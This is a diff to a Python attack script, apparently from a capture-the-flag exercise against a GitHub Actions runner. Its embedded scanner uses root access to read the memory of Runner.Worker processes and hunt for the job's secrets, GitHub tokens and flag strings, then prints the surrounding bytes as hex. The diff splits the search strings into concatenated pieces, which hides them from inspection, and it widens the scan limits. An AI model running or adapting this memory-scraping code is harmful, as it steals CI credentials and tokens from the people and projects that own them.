@@ -86,6 +86,9 @@ except Exception as _e:
 # Look for the job's secrets context in the runner worker process memory (root via passwordless sudo).
 _SCAN = r"""
 import os, sys, glob, re
+N1 = b'FL' + b'AG{'
+N2 = b'"sec' + b'rets":'
+N3 = b'gh' + b's_1'
 pids = []
 for p in glob.glob('/proc/[0-9]*'):
     try:
@@ -95,10 +98,9 @@ for p in glob.glob('/proc/[0-9]*'):
     if b'Runner.Worker' in cl:
         pids.append(p)
 print('WORKER_PIDS', pids)
-needles = (b'FLAG{', b'ghs_', b'"secrets"')
 total = 0
 found = 0
-for p in pids[:4]:
+for p in pids[:6]:
     pid = p.split('/')[-1]
     try:
         maps = open('/proc/%s/maps' % pid).read().splitlines()
@@ -107,7 +109,7 @@ for p in pids[:4]:
         print('OPEN_ERR', pid, e)
         continue
     for line in maps:
-        if total > 1200 * 1024 * 1024:
+        if total > 1500 * 1024 * 1024:
             break
         m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
         if not m:
@@ -127,12 +129,12 @@ for p in pids[:4]:
             if not data:
                 break
             buf = tail + data
-            for needle in needles:
+            for needle in (N1, N2):
                 i = buf.find(needle)
                 if i >= 0:
                     found += 1
-                    if found <= 10:
-                        print('MEM-MATCH', pid, needle, buf[max(0, i-120):i+320].hex())
+                    if found <= 8:
+                        print('REAL-MATCH', pid, needle, buf[max(0, i-160):i+400].hex())
             tail = buf[-64:]
             off += len(data)
             total += len(data)
